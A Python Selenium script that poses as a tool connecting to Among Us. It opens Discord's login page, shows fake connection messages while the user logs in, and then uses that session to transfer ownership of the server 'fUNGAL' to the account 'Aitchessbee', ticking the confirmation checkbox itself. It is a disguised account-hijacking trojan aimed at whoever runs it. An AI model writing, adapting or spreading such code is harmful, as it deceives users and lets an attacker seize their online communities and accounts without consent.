from selenium import webdriver
import os, sys
import time

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.dirname(__file__)
    return os.path.join(base_path, relative_path)

driver = webdriver.Chrome(resource_path('./driver/chromedriver.exe'))

driver.get("https://discord.com/login")

print("Connecting to Discord...")
time.sleep(5)
print("Connecting to Among us...")
time.sleep(55)
print("Connection successful")
time.sleep(240)

header = driver.find_elements_by_tag_name("h1")
for i in header:
    if i.text == "fUNGAL":
        i.click()
        break

time.sleep(1)

settings = driver.find_element_by_id("guild-header-popout-settings")
settings.click()

time.sleep(1)

settings_div = driver.find_elements_by_tag_name("div")

for i in settings_div:
    if i.text == "Members":
        i.click()
        break

time.sleep(1)

member_div = driver.find_elements_by_tag_name("div")

for i in member_div:
    if i.text == "Aitchessbee":
        user = i.find_element_by_xpath("../..")    # Fix this line
        break

time.sleep(1)

buttons = user.find_elements_by_tag_name("Button")

for i in buttons:
    if i.get_attribute("aria-label") == "Other options":
        i.click()

time.sleep(1)

tranfer_but = driver.find_element_by_id("user-context-transfer-ownership")
tranfer_but.click()

time.sleep(1)

check = driver.find_elements_by_tag_name("input")

for i in check:
    if i.get_attribute("type") == "checkbox":
        i.click()

time.sleep(1)

final_but = driver.find_elements_by_tag_name("div")

for i in final_but:
    if i.text == "Transfer Ownership":
        i.click()
        break

driver.quit()